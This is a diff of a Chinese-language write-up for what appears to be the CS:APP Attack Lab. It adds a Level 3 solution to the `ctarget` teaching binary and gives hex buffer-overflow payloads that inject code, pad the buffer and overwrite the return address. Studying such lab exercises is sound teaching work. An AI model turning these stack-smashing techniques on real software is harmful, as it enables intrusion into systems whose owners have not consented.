@@ -37,7 +37,7 @@ cat ans | ./hex2raw | ./ctarget -q
   4017e7:       e8 54 f6 ff ff          callq  400e40 <exit@plt>
 ```
 
-因此, 做法是劫持 `4017af` 压入栈顶的返回地址 `4017b4`, 将其修改为 `4017c0`.
+因此, 做法是劫持 `4017bd` 的返回地址, 将其修改为 `4017c0`.
 
 攻击 payload 是 40 个字节的填充以及 8 个字节的返回地址:
 
@@ -90,4 +90,18 @@ retq
 
 ```
 bf fa 97 b9 59 68 ec 17 40 00 c3 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 78 dc 61 55 00 00 00 00
+```
+
+### Level 3
+
+`touch3` 接受一个存储有 `cookie` 字符串的地址, 在之前, 我们只修改过寄存器, 这次还需要修改栈内容, 并且注意到提示:
+
+> When functions `hexmatch` and `strncmp` are called, they push data onto the stack, overwriting portions of memory that held the buffer used by `getbuf`.
+
+因此要写入到更深的栈, 即 `getbuf` 的调用者 `test` 的栈帧 `0x5561dca8`.
+
+攻击 payload 是:
+
+```
+48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61
 ```
